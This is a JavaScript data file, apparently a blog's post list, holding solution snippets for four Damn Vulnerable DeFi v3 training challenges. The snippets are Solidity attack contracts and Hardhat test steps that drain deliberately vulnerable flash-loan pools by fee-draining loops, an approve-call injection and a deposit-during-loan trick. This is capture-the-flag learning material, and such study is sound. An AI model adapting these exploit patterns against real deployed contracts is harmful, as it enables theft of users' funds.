export default {
    posts: [
        {
            id: "damn-vulnerable-defi-solutions-1-unstoppable",
            title: `Damn Vulnerable DeFi v3 Solutions 1: Unstoppable`,
            description: `Solution for the 1st Damn Vulnerable DeFi v3 challenge.`,
            date: "January 12, 2023",
            snippets: [
                `if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();`,
                `it("Execution", async function () {
  await token
      .connect(player)
      .transfer(vault.address, ethers.utils.parseEther("1"));
});`,
            ],
        },
        {
            id: "damn-vulnerable-defi-solutions-2-naive-receiver",
            title: `Damn Vulnerable DeFi v3 Solutions 2: Naive Receiver`,
            description: `Solution for the 2nd Damn Vulnerable DeFi v3 challenge.`,
            date: "January 12, 2023",
            snippets: [
                `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./NaiveReceiverLenderPool.sol";

contract Attack {
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    function init(address payable _pool, address _receiver) public {
        IERC3156FlashBorrower receiver = IERC3156FlashBorrower(_receiver);
        NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(_pool);
        
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(receiver, ETH, 1 ether, "x0");
        }
    }
}`,
                `it("Execution", async function () {
    const attackContract = await (
        await ethers.getContractFactory("Attack", deployer)
    ).deploy();

    attackContract.init(pool.address, receiver.address);
});`,
            ],
        },
        {
            id: "damn-vulnerable-defi-solutions-3-truster",
            title: `Damn Vulnerable DeFi v3 Solutions 3: Truster`,
            description: `Solution for the 3rd Damn Vulnerable DeFi v3 challenge.`,
            date: "January 12, 2023",
            snippets: [
                `function exploit(DamnValuableToken token, TrusterLenderPool pool, address receiver) external {
    bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
    pool.flashLoan(0, receiver, address(token), data);
    token.transferFrom(address(pool), receiver, 1_000_000 ether);
}`,
                `it("Execution", async function () {
    exploit = await (
        await ethers.getContractFactory("Exploit", player)
    ).deploy();

    await exploit.init(token.address, pool.address, player.address);
});`,
            ],
        },
        {
            id: "damn-vulnerable-defi-solutions-4-side-entrance",
            title: `Damn Vulnerable DeFi v3 Solutions 4: Side Entrance`,
            description: `Solution for the 4th Damn Vulnerable DeFi v3 challenge.`,
            date: "January 12, 2023",
            snippets: [
                `function exploit() public {
    //pool.flashLoan() will make a call to 'execute()' function where we exploit the contract
    pool.flashLoan(1000 ether);
    //Withdraw the credited balance to this contract
    pool.withdraw();
    //Transfer the stolen funds to attacker's EOA
    receiver.transfer(address(this).balance);
}

//calback function. Called by SideEntranceLenderPool::flashLoan
function execute() public payable {
    //return the flash loan using 'deposit()' function.
    //Using 'deposit()' will credit this contract for the amount of FL
    pool.deposit{value: address(this).balance}();
}

//This is necessary for the contract to be able to receive ETH
receive() external payable {}`,
            ],
        },
    ],
};
